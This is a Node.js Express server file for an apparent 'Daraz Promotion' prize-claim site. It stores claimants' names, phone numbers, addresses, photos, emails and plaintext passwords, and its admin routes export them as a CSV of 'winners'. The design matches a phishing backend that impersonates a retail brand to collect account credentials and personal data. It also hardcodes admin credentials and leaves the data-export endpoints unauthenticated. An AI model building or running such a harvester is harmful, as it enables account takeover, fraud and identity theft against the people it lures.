const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const morgan = require('morgan');
const Database = require('better-sqlite3');
const { Parser } = require('json2csv');
const path = require('path');

const app = express();
const PORT = 5000;

// Database Setup
const db = new Database(path.join(__dirname, 'data.db'));
db.exec(`
  CREATE TABLE IF NOT EXISTS submissions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    fullName TEXT,
    phoneNumber TEXT,
    city TEXT,
    chowk TEXT,
    address TEXT,
    photo TEXT,
    email TEXT,
    password TEXT,
    reward TEXT,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// Middleware
app.use(cors());
app.use(morgan('dev'));
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ limit: '10mb', extended: true }));

// Serve static files from the React app
app.use(express.static(path.join(__dirname, '../client/dist')));

// Routes
app.get('/api-status', (req, res) => {
  res.json({ message: 'Daraz Promotion API is running' });
});

// For any other request, send back index.html (SPA support)
app.get('(.*)', (req, res, next) => {
  if (req.path.startsWith('/api')) return next();
  res.sendFile(path.join(__dirname, '../client/dist/index.html'));
});

app.post('/api/claim', (req, res) => {
  const { fullName, phoneNumber, city, chowk, address, photo, email, password, reward } = req.body;
  
  const stmt = db.prepare(`
    INSERT INTO submissions (fullName, phoneNumber, city, chowk, address, photo, email, password, reward) 
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);
  
  stmt.run(fullName, phoneNumber, city, chowk, address, photo, email, password, reward);

  res.json({ success: true, message: 'Submission saved successfully' });
});

// Admin Auth (Simple for demo)
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === '9823976977' && password === 'mrgf7h$') {
    res.json({ success: true, token: 'fake-jwt-token' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

app.get('/api/admin/submissions', (req, res) => {
  // In a real app, verify token
  const submissions = db.prepare('SELECT * FROM submissions ORDER BY createdAt DESC').all();
  res.json({ success: true, data: submissions });
});

app.delete('/api/admin/submissions/:id', (req, res) => {
  const { id } = req.params;
  try {
    const stmt = db.prepare('DELETE FROM submissions WHERE id = ?');
    stmt.run(id);
    res.json({ success: true, message: 'Submission deleted successfully' });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Error deleting submission' });
  }
});

app.get('/api/admin/export', (req, res) => {
  const submissions = db.prepare(`
    SELECT id, fullName, phoneNumber, city, chowk, address, photo, email, password, reward, createdAt 
    FROM submissions
  `).all();
  try {
    const json2csvParser = new Parser();
    const csv = json2csvParser.parse(submissions);
    res.header('Content-Type', 'text/csv');
    res.attachment('winner_submissions.csv');
    res.send(csv);
  } catch (err) {
    res.status(500).send('Error exporting CSV');
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
